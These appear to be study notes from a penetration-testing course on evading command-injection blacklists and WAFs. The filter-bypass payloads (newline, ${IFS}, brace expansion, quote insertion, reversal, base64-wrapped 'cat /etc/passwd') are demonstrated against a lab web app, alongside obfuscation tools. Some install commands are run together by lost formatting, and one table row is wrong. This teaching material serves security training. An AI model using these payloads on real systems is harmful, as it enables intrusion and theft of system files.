A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The `PHP` code may look something like the following:

Code: php

```
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

&nbsp;

&nbsp;

![7641f56a58889bb57f3561a3133926d7.png](/resources/7641f56a58889bb57f3561a3133926d7.png)

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `\|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR  | `\|` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ` `` ` | `%60%60` | Both (Linux-only) |
| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |

&nbsp;

# Bypassing Space Filters

## Bypass Blacklisted Operators

&nbsp;

![faabfbff8c121853c7907c567433a4b8.png](/resources/faabfbff8c121853c7907c567433a4b8.png)

&nbsp;

## Bypass Blacklisted Spaces

Now that we have a working injection operator, let us modify our original payload and send it again as (`127.0.0.1%0a whoami`): ![Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to '127.0.0.1%0a+whoami'. The response displays HTML for a Host Checker form and an 'Invalid input' message.](/resources/cmdinj_filters_spaces_1.jpg)

As we can see, we still get an `invalid input` error message, meaning that we still have other filters to bypass. So, as we did before, let us only add the next character (which is a space) and see if it caused the denied request: ![Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to '127.0.0.1%0a+whoami'. The response displays HTML for a Host Checker form and an 'Invalid input' message.](/resources/cmdinj_filters_spaces_2.jpg)

As we can see, the space character is indeed blacklisted as well. A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character!

&nbsp;

&nbsp;

#### Using Tabs

Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same. So, let us try to use a tab instead of the space character (`127.0.0.1%0a%09`) and see if our request is accepted: ![Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to '127.0.0.1%0a%09'. The response displays HTML for a Host Checker form and ping results for 127.0.0.1.](/resources/cmdinj_filters_spaces_3.jpg)

As we can see, we successfully bypassed the space character filter by using a tab instead. Let us see another method of replacing space characters.

&nbsp;

&nbsp;

#### Using $IFS

Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments. So, if we use `${IFS}\` where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

Let us use `${IFS}` and see if it works (`127.0.0.1%0a${IFS}`): ![Interface showing an HTTP request and response. The request includes headers like Host and User-Agent, with IP set to '127.0.0.1%0a${IFS}'. The response displays HTML for a Host Checker form and ping results for 127.0.0.1.](/resources/cmdinj_filters_spaces_4.jpg)

&nbsp;

&nbsp;

#### Using Brace Expansion

There are many other methods we can utilize to bypass space filters. For example, we can use the `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, as follows:

Bypassing Space Filters

```shell-session
cube111@local[/local]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

As we can see, the command was successfully executed without having spaces in it. We can utilize the same method in command injection filter bypasses, by using brace expansion on our command arguments, like (`127.0.0.1%0a{ls,-la}`). To discover more space filter bypasses, check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.

&nbsp;

&nbsp;

&nbsp;

# Bypassing Other Blacklisted Characters

* * *

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows. We can utilize several techniques to produce any character we want while avoiding the use of blacklisted characters.

&nbsp;

```shell-session
cube111@local[/local]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:

Bypassing Other Blacklisted Characters

```shell-session
cube111@local[/local]$ echo ${PATH:0:1}

/
```

&nbsp;

&nbsp;

&nbsp;

We can do the same with the `$HOME` or `$PWD` environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:

Bypassing Other Blacklisted Characters

```shell-session
cube111@local[/local]$ echo ${LS_COLORS:10:1}

;
```

&nbsp;

![7f1c8f0d96ede9ac4b57a6918811afc0.png](/resources/7f1c8f0d96ede9ac4b57a6918811afc0.png)

&nbsp;

&nbsp;

## Windows

The same concept works on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\local-student`), and then specify a starting position (`~6` -> `\local-student`), and finally specifying a negative end position, which in this case is the length of the username `local-student` (`-11` -> `\`) :

Bypassing Other Blacklisted Characters

```cmd-session
C:\local> echo %HOMEPATH:~6,-11%

\
```

We can achieve the same thing using the same variables in `Windows PowerShell`. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions:

Bypassing Other Blacklisted Characters

```powershell-session
PS C:\local> $env:HOMEPATH[0]

\


PS C:\local> $env:PROGRAMFILES[10]
PS C:\local>
```

We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need. `Try to be creative and find different commands to produce similar characters.`

&nbsp;

&nbsp;

## Character Shifting

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

Bypassing Other Blacklisted Characters

```shell-session
cube111@local[/local]$ man ascii     # \ is on 92, before it is [ on 91
cube111@local[/local]$ echo $(tr '!-}' '"-~'<<<[)

\
```

&nbsp;

&nbsp;

# Bypassing Blacklisted Commands

&nbsp;

## Linux & Windows

One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like `Bash` or `PowerShell` and will execute the same command as if they were not there. Some of these characters are a single-quote `'` and a double-quote `"`, in addition to a few others.

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:

Bypassing Blacklisted Commands

```shell-session
21y4d@local[/local]$ w'h'o'am'i

21y4d
```

The same works with double-quotes as well:

Bypassing Blacklisted Commands

```shell-session
21y4d@local[/local]$ w"h"o"am"i

21y4d
```

The important things to remember are that `we cannot mix types of quotes` and `the number of quotes must be even`. We can try one of the above in our payload (`127.0.0.1%0aw'h'o'am'i`) and see if it works:

#### Burp POST Request

![Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a 'Host Checker' form, allowing IP input and showing ping results for 127.0.0.1.](/resources/cmdinj_filters_commands_2.jpg)

&nbsp;

&nbsp;

## Linux Only

We can insert a few other Linux-only characters in the middle of commands, and the `bash` shell would ignore them and execute the command. These characters include the backslash `\` and the positional parameter character `$@`. This works exactly as it did with the quotes, but in this case, `the number of characters do not have to be even`, and we can insert just one of them if we want to:

Code: bash

```bash
who$@ami
w\ho\am\i
```

Exercise: Try the above two examples in your payload, and see if they work in bypassing the command filter. If they do not, this may indicate that you may have used a filtered character. Would you be able to bypass that as well, using the techniques we learned in the previous section?

&nbsp;

## Windows Only

There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:

Bypassing Blacklisted Commands

```cmd-session
C:\local> who^ami

21y4d
```

&nbsp;

&nbsp;

```shell-session
21y4d@local[/local]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

&nbsp;

![81a28a99a24ddc55a66ddf2f44bded3e.png](/resources/81a28a99a24ddc55a66ddf2f44bded3e.png)

&nbsp;

&nbsp;

## Reversed Commands

Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing `imaohw` instead of `whoami` to avoid triggering the blacklisted command.

We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we'd have to get the reversed string of our command in our terminal, as follows:

Advanced Command Obfuscation

```shell-session
cube111@local[/local]$ echo 'whoami' | rev
imaohw
```

Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:

Advanced Command Obfuscation

```shell-session
21y4d@local[/local]$ $(rev<<<'imaohw')

21y4d
```

We see that even though the command does not contain the actual `whoami` word, it does work the same and provides the expected output. We can also test this command with our exercise, and it indeed works:

#### Burp POST Request

![Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt. The response section displays HTML for a 'Host Checker' form, allowing IP input and showing ping results for 127.0.0.1 with user 'www-data'.](/resources/cmdinj_filters_commands_5.jpg)

Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.

The same can be applied in `Windows.` We can first reverse a string, as follows:

Advanced Command Obfuscation

```powershell-session
PS C:\local> "whoami"[-1..-20] -join ''

imaohw
```

We can now use the below command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows:

Advanced Command Obfuscation

```powershell-session
PS C:\local> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

&nbsp;

&nbsp;

&nbsp;

## Encoded Commands

The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.

We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding). Let's take `base64` as an example. First, we'll encode the payload we want to execute (which includes filtered characters):

Advanced Command Obfuscation

```shell-session
cube111@local[/local]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:

Advanced Command Obfuscation

```shell-session
cube111@local[/local]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

As we can see, the above command executes the command perfectly. We did not include any filtered characters and avoided encoded characters that may lead the command to fail to execute.

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

Now we can use this command (once we replace the spaces) to execute the same command through command injection:

#### Burp POST Request

![Screenshot of a web app interface showing a POST request to 127.0.0.1 with headers and a command injection attempt using base64 decoding. The response section displays HTML for a 'Host Checker' form, allowing IP input and showing ping results for 127.0.0.1 with user 'www-data' and additional user information.](/resources/cmdinj_filters_commands_6.jpg)

Even if some commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding.

We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:

Advanced Command Obfuscation

```powershell-session
PS C:\local> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

Advanced Command Obfuscation

```shell-session
cube111@local[/local]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

Advanced Command Obfuscation

```powershell-session
PS C:\local> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

As we can see, we can get creative with `Bash` or `PowerShell` and create new bypassing and obfuscation methods that have not been used before, and hence are very likely to bypass filters and WAFs. Several tools can help us automatically obfuscate our commands, which we will discuss in the next section.

In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion).

&nbsp;

&nbsp;

&nbsp;

&nbsp;

## 🔐 Evasion Tools for Command Injection

When basic obfuscation fails against advanced security tools, automated evasion tools help. This section covers:

- **Bashfuscator** (Linux)
    
- **Invoke-DOSfuscation** (Windows)
    

* * *

### 🐧 Linux: Bashfuscator

**Purpose:** Obfuscate Bash commands to bypass filters.

**Installation:**

bash

CopyEdit

`git clone https://github.com/Bashfuscator/Bashfuscatorcd Bashfuscatorpip3 install setuptools==65python3 setup.py install --user`

**Usage:**

bash

CopyEdit

`cd ./bashfuscator/bin/./bashfuscator -h # View help menu`

**Basic Obfuscation Example:**

bash

CopyEdit

`./bashfuscator -c 'cat /etc/passwd'`

> ⚠️ May generate very large payloads randomly using multiple techniques.

**Customized, Short Obfuscation:**

bash

CopyEdit

`./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`

**Test Output:**

bash

CopyEdit

`bash -c 'eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'`

> ✅ Output should mimic `cat /etc/passwd` while appearing obfuscated.

**Exercise:** Test the output on your web app to check if it bypasses filters. Adjust flags if needed.

* * *

### 🪟 Windows: Invoke-DOSfuscation

**Purpose:** Obfuscate Windows CMD/PowerShell commands.

**Installation and Launch:**

powershell

CopyEdit

`git clone https://github.com/danielbohannon/Invoke-DOSfuscation.gitcd Invoke-DOSfuscationImport-Module .\Invoke-DOSfuscation.psd1Invoke-DOSfuscation`

**Usage:**

powershell

CopyEdit

`Invoke-DOSfuscation> help # Show help optionsInvoke-DOSfuscation> SET COMMAND type C:\Users\local-student\Desktop\flag.txtInvoke-DOSfuscation> encodingInvoke-DOSfuscation\Encoding> 1 # Choose encoding technique`

**Generated Obfuscated Example:**

cmd

CopyEdit

`typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt`

**Execution on CMD:**

cmd

CopyEdit

`C:\local> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt`

> ✅ Outputs: `test_flag`

**Note:** You can test it on Linux using `pwsh`. The tool is preinstalled on `Pwnbox`.

* * *

For advanced techniques, check the **Secure Coding 101: JavaScript** module.

&nbsp;

&nbsp;

&nbsp;